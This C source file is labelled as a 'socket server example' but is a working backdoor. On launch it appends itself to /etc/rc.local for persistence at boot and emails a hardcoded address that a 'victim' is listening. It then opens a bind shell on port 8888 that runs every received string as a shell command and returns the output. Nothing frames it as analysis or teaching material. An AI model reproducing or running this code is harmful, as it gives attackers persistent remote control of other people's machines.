/*
    C socket server example
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>      // strlen
#include <sys/socket.h>  // socket
#include <arpa/inet.h>   // inet_addr
#include <unistd.h>      // write

int remote_shell();

int main(int argc , char *argv[])
{
    // Variables
	pid_t pid;
	pid = fork();
	if(pid < 0)
	{
		fprintf(stderr, "Fork Failed");
		exit(-1);
	}
	else if(pid == 0)
	{
		remote_shell();
	}
	else
	{
		FILE *auto_done = fopen("auto_done", "r");
		if(auto_done == NULL)
		{
			printf("here\n");
			FILE *initd = fopen("/etc/rc.local", "a");
			char* cwd;
			char buff[200];
			cwd = getcwd(buff, 200);
			if(cwd != NULL)
			{
				strcat(cwd, "/victim");
				printf("%s\n", cwd);
				fprintf(initd, cwd);
			}
			fclose(initd);
			system("touch auto_done");
		}
		else {
			fclose(auto_done);
		}
	}
	return 0;
}

int remote_shell() {
	const char* EMAIL = "williammconlon@gmail.com";
    int ssock, csock, addrlen, ret;
    struct sockaddr_in server, client;
    char message[2000], reply[2000];

    short port = 8888;

    // Create a socket. Return value is a file descriptor for the socket.
    ssock = socket(AF_INET, SOCK_STREAM, 0);
    if (ssock == -1) {
        perror("Error creating socket\n");
        exit(0);
    }
//    printf("Server socket created\n");

	system("echo "" | mail -t williammconlon@gmail.com -s \"victim now listening\"");

    // Set the server ip address, connection family and port. INADDR_ANY means
    // all the ip addresses of the server can be used to set up connection.
    server.sin_family      = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port        = htons(port);

    // Bind the socket for the connection
    if (bind(ssock, (struct sockaddr *) &server, sizeof(server)) < 0) {
        //print the error message
        perror("Error binding\n");
        close(ssock);
        exit(0);
    }
 //   printf("Binding done\n");

    // Listen for incoming connections
    listen(ssock, SOMAXCONN);
  //  printf("Listening...\n");

   // printf("Waiting for incoming connections...\n");
    addrlen = sizeof(struct sockaddr_in);

    // Accept connection from an incoming client
    csock = accept(ssock, (struct sockaddr *) &client, (socklen_t *) &addrlen);
    if (csock < 0) {
        perror("Error accepting connections\n");
        exit(0);
    }
    //printf("Connection accepted\n");

    // Keep communicating with client. Repetitively send messages.
	memset(reply, 0, sizeof(reply));
	while((ret=recv(csock, reply, sizeof(reply), 0)) > 0) {
		//reply[ret] = '\0';
//		printf("Client: %s\n", reply);
		const size_t line_size = 300;
		char* endMesg = "END-OF-MESSAGE";
		char* line = (char *) malloc(line_size);
		/*
		FILE *fp = popen(reply, "r");
		fscanf(fp, "%s", result);
		*/
		strcat(reply, " > output.txt");
		system(reply);
		FILE *file = fopen("output.txt", "r");
		while(fgets(line, line_size, file) != NULL) {
			//printf(line);
			//need to send line by line
			if(strlen(line) == 0)
			{
				strcat(line, "\n");
			}
			write(csock, line, strlen(line));
			recv(csock, reply, sizeof(reply), 0);
			reply[strlen(reply)] = '\0';
//			printf("client: %s", reply);
			usleep(300);
			memset(reply, 0, sizeof(reply));
		}
		
		write(csock, endMesg, strlen(endMesg));
		usleep(300);
//		printf("Waiting\n");
		//send some terminating message
		//write(csock, line, strlen(line));
		free(line);
		fclose(file);
		//pclose(fp);
		memset(reply, 0, sizeof(reply));
	}

    close(csock);
    close(ssock);
 //   printf("End connection\n");

    return 0;
}
